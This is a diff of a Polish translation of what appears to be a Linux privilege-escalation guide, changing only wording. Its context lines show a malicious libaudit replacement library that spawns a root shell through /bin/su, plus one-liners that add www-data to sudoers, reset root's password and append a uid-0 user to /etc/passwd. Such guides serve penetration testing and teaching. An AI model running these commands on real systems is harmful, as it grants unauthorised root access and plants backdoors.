@@ -51,11 +51,11 @@ return 0;
 - Dodanie użytkownika z hasłem do _/etc/passwd_
 - Zmiana hasła w _/etc/shadow_
 - Dodanie użytkownika do sudoers w _/etc/sudoers_
-- Abuse Docker przez socket Docker, zwykle w _/run/docker.sock_ lub _/var/run/docker.sock_
+- Wykorzystanie Docker przez socket Docker, zwykle w _/run/docker.sock_ lub _/var/run/docker.sock_
 
 ### Nadpisywanie biblioteki
 
-Sprawdź bibliotekę używaną przez plik binarny, w tym przypadku `/bin/su`:
+Sprawdź bibliotekę używaną przez niektóre pliki binarne, w tym przypadku `/bin/su`:
 ```bash
 ldd /bin/su
 linux-vdso.so.1 (0x00007ffef06e9000)
@@ -76,7 +76,7 @@ objdump -T /bin/su | grep audit
 0000000000000000      DF *UND*  0000000000000000              audit_log_acct_message
 000000000020e968 g    DO .bss   0000000000000004  Base        audit_fd
 ```
-Symbole `audit_open`, `audit_log_acct_message`, `audit_log_acct_message` oraz `audit_fd` prawdopodobnie pochodzą z biblioteki libaudit.so.1. Ponieważ libaudit.so.1 zostanie nadpisana przez złośliwą bibliotekę współdzieloną, te symbole powinny być obecne w nowej bibliotece współdzielonej. W przeciwnym razie program nie będzie w stanie odnaleźć symbolu i zakończy działanie.
+Symbole `audit_open`, `audit_log_acct_message`, `audit_log_acct_message` i `audit_fd` prawdopodobnie pochodzą z biblioteki libaudit.so.1. Ponieważ libaudit.so.1 zostanie nadpisana przez złośliwą bibliotekę współdzieloną, symbole te powinny być obecne w nowej bibliotece współdzielonej. W przeciwnym razie program nie będzie w stanie znaleźć symbolu i zakończy działanie.
 ```c
 #include<stdio.h>
 #include<stdlib.h>
@@ -98,13 +98,13 @@ setgid(0);
 system("/bin/bash");
 }
 ```
-Teraz, wywołując **`/bin/su`**, uzyskasz shell jako root.
+Teraz, po prostu wywołując **`/bin/su`**, uzyskasz powłokę jako root.
 
 ## Skrypty
 
 Czy możesz sprawić, aby root wykonał coś?
 
-### **www-data do sudoers**
+### **www-data to sudoers**
 ```bash
 echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
 ```
@@ -112,7 +112,7 @@ echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers
 ```bash
 echo "root:hacked" | chpasswd
 ```
-### Dodaj nowego użytkownika root do /etc/passwd
+### Dodawanie nowego użytkownika root do /etc/passwd
 ```bash
 echo hacker:$((mkpasswd -m SHA-512 myhackerpass || openssl passwd -1 -salt mysalt myhackerpass || echo '$1$mysalt$7DTZJIc9s6z60L6aj0Sui.') 2>/dev/null):0:0::/:/bin/bash >> /etc/passwd
 ```
